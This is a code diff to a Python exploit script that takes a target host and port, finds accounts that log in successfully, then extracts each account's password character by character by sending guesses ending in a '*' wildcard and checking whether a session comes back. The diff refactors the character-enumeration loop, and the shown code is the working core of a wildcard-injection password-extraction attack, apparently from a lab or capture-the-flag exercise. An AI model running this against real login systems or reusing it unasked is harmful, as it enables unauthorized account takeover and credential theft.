@@ -3,6 +3,7 @@
 import requests
 import sys
 import json
+import string
 
 if len(sys.argv) < 3:
     print("Usage: {} <HOST_IP> <PORT>".format(sys.argv[0]))
@@ -65,7 +66,10 @@ for i in uniqs:
         print("[+] Successful login for account: {}".format(username))
         success_logins.append(username)
 
-all_chars = [chr(i) for i in range(0x21,0x7f) if i != 0x2a]
+#all_chars = [chr(i) for i in range(0x21,0x7f) if i != 0x2a]
+#More optimized than above
+all_chars = list(string.ascii_lowercase+string.ascii_uppercase+string.punctuation+string.digits)
+all_chars.remove("*")
 
 for username in success_logins: 
 
@@ -74,27 +78,25 @@ for username in success_logins:
     all_chars_failed = False
 
     while not all_chars_failed:
+        
+        for c in all_chars:
 
-        for i in range(0,(len(all_chars) - 1)):
-
-            #Reached the end of the char list w/ no match. PW is fully enumerated.
-            if i >= (len(all_chars) - 1):          
-                all_chars_failed = True
-                break
-
-            #Write the currently tested char / position to stdout                
-            write_char(all_chars[i])           
+            #Write the currently tested char / position to stdout
+            write_char(c)
 
             #Append a splat to the chars enumerated thus far
-            test_password = "{}{}*".format(enumerated_password, all_chars[i])
+            test_password = "{}{}*".format(enumerated_password, c)
 
             #If the current enumerated chars + * returned a session
             if do_login(login_url, username, test_password):
-                enumerated_password += all_chars[i]
+                enumerated_password += c 
                 break
-
             #Delete last tested char that failed            
             else:
                 write_char("\b")
-
-print("\n[+] Done.")                      
+            #Reached the end of the char list w/ no match. PW is fully enumerated.
+            if c == all_chars[-1]:                     
+                write_char(" ")
+                all_chars_failed = True
+       
+print("\n[+] Done.")      
